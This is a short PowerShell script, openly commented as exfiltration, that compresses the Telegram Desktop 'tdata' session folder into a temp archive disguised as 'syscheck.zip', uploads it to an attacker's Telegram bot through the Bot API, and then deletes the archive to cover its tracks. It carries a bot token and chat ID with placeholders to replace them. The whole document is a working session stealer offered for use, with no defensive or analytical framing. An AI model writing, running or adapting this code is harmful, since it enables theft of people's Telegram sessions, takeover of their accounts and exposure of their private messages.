# 1. Define paths using native Windows environment variables
$tdataPath = "$env:APPDATA\Telegram Desktop\tdata"
$zipPath   = "$env:TEMP\syscheck.zip"

# Function to safely compress directory
function Compress-Directory {
    param (
        [string]$SourcePath,
        [string]$DestinationPath
    )
    try {
        if (Test-Path $SourcePath) {
            # Remove existing ZIP to avoid conflicts
            if (Test-Path $DestinationPath) {
                Remove-Item $DestinationPath -Force
            }
            Compress-Archive -Path $SourcePath -DestinationPath $DestinationPath -Force
            return $true
        } else {
            Write-Warning "Source directory not found: $SourcePath"
            return $false
        }
    } catch {
        Write-Error "Failed to compress directory: $_"
        return $false
    }
}

# 2. Compress the directory if it exists
if (Compress-Directory -SourcePath $tdataPath -DestinationPath $zipPath) {
    # 3. Exfiltrate the file using native web request utilities
    $botToken = "8853091711:AAHXtKxyYTa91Xn0_Lgb4QXj0481ZRspQ4M"    # Replace with your bot token
    $chatId   = "8699240431"      # Replace with your chat ID
    $url      = "https://api.telegram.org/bot$botToken/sendDocument"

    # Verify the ZIP file exists before sending
    if (Test-Path $zipPath) {
        try {
            # Prepare the request body as multipart/form-data
            $form = @{
                chat_id  = $chatId
                document = Get-Item $zipPath
            }

            # Send the document
            Invoke-RestMethod -Uri $url -Method Post -Form $form
            Write-Output "File sent successfully."
        } catch {
            Write-Error "Failed to send file: $_"
        }

        # 4. Remove the temporary archive from disk
        try {
            Remove-Item $zipPath -Force
        } catch {
            Write-Warning "Failed to delete ZIP file: $_"
        }
    } else {
        Write-Warning "ZIP file not found at $zipPath"
    }
} else {
    Write-Warning "Compression failed or source directory missing."
}
